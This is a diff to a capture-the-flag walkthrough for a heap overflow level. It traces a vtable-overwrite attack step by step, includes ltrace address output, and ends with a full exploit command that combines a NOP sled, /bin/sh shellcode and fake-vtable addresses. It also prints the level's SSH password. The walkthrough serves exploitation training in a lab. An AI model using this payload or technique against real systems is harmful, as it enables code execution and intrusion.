@@ -10,7 +10,11 @@
    - Main allocates two N objects and calls setAnnotation(argv[1]) on first object
    - Then calls virtual function through second object's vtable
 
-3. Verify heap layout with ltrace:
+3. Connect to the VM via SSH:
+   ssh level9@localhost -p 2222
+   Password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
+4. Verify heap layout with ltrace:
    ltrace ./level9 AAAA
    
    Output shows:
@@ -22,7 +26,7 @@
    obj1 annotation buffer starts at: 0x804a00c (obj1 + 4)
    obj2 vtable pointer at: 0x804a078
 
-4. Calculate the exploit:
+5. Calculate the exploit:
    Goal: Overflow obj1's annotation buffer to overwrite obj2's vtable pointer
    
    Distance from annotation buffer to obj2 vtable:
@@ -55,10 +59,6 @@
    
    The fake vtable at 0x0804a07c contains the address 0x0804a01c,
    which points into our NOP sled, sliding into shellcode.
-
-5. Connect to the VM via SSH:
-   ssh level9@localhost -p 2222
-   Password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
 
 6. Execute the exploit:
    ./level9 $(python -c 'print "\x90"*44 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*40 + "\x7c\xa0\x04\x08" + "\x1c\xa0\x04\x08"')
